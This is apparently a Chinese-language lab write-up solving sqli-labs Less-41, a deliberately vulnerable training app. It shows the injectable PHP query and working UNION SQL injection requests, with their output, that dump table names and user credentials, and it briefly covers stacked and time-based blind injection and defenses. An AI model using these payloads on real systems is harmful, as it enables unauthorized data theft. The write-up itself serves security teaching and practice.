## 题目: Sqli‑labs Less‑41

## 题目描述
页面提示 `Please input the ID as parameter with numeric value`，回显 `Your Username is : ...` / `Your Password is : ...`。标题是 `Less‑41 **stacked Query Intiger type blind**`。该关卡是 Less‑39 的盲注版本，属于数字型，使用 `mysqli_multi_query()`，移除了报错输出。

## 核心原理与前置分析
源码关键：
```php
$sql = "SELECT * FROM users WHERE id=$id LIMIT 0,1";
if (mysqli_multi_query($con1, $sql))
{
    if ($result = mysqli_store_result($con1)) { ... 打印第一行 ... }
}
// 注意：没有 else，也没有 print_r(mysqli_error())
```

与 Less‑39 唯一区别：SQL 语句出错页面无任何报错提示。
- 无法依靠报错判断闭合与列数；
- UNION 属于正常查询，结果依旧可以打印，并非完全无回显的全盲；
- 堆叠语句可以执行，但不会回显，只能依靠布尔、时间或者数据库层面变化判断执行效果。

**解题思路**
1. 数字型注入，直接使用`union select`探测列数，确定回显位置，无需引号；
2. 使用 UNION 联合查询爆出库、表、字段数据；
3. 使用`;`执行堆叠写操作，通过数据库变化验证执行；
4. 当 UNION 被限制时，可以使用布尔盲注或者时间盲注进行数据猜解。

## 解题步骤
### 1. 确认列数与回显位
```
GET /sqli-labs/Less-41/?id=-1%20union%20select%201,2,3--%20- HTTP/1.1
Host: 127.0.0.1
```

页面输出：
```
Your Username is : 2
Your Password is : 3
```
查询共 3 列，第 2、3 列存在回显。

### 2. 布尔对照测试
```
GET /sqli-labs/Less-41/?id=1%20and%201=1--%20- HTTP/1.1
GET /sqli-labs/Less-41/?id=1%20and%201=2--%20- HTTP/1.1
```

| 请求 | 回显 |
| --- | --- |
| `1 and 1=1` | `Dumb` |
| `1 and 1=2` | 空白 |

> 
> 数字注入布尔对照结果干净，可用于布尔盲注判断依据。

### 3. UNION 联合查询爆破数据

获取当前数据库名
```
GET /sqli-labs/Less-41/?id=-1%20union%20select%201,database(),3--%20- HTTP/1.1
```

获取库内全部表名
```
GET /sqli-labs/Less-41/?id=-1%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=database()--%20- HTTP/1.1
```

读取 users 表用户名密码
```
GET /sqli-labs/Less-41/?id=-1%20union%20select%201,group_concat(username,0x3a,password),3%20from%20users--%20- HTTP/1.1
```

实测回显结果：
```
Your Username is : security
Your Username is : emails,referers,uagents,users
Your Username is : Dumb:Dumb,Angelina:I‑kill‑you,...,admin:888888,...
```

## 踩坑记录
1. 看到 “blind” 不要认为完全无回显：仅关闭报错回显，UNION 查询结果仍然输出页面，不要直接上手写盲注。
2. 不要直接复制 Less‑40 的`‑1')`payload；本关属于数字型，不存在引号与括号，直接使用`‑1 union ...`。
3. 不能单凭`1 and 1=2`一个请求判断注入，需要成对对比`and 1=1`与`and 1=2`。
4. 堆叠内部的 SELECT 不会页面回显。`mysqli_store_result()`只会读取第一条 SQL 结果集，后续 SQL 执行但页面不展示。
5. 写操作完成后执行 drop 删除临时测试表，防止污染靶场数据库。

## 知识点总结
- **数字型堆叠报错盲注入**：原始 SQL 为`id=$id`，payload 不需要引号；关闭报错输出，依靠布尔、时间、数据库变化判断执行情况。
- Blind 在这里指**报错盲**，并非完全无回显，优先使用 UNION 联合查询。
- **时间盲注**：利用`sleep()`函数，搭配`if()`条件，依靠响应时间差逐字符猜解数据。
- **堆叠注入**：依赖`mysqli_multi_query()`实现多语句执行，页面仅返回第一条 SQL 结果集。
- **防御方案**：使用预编译 + 参数绑定；id 参数强制转换 int 类型；数据库账号最小权限；关闭多语句查询功能。
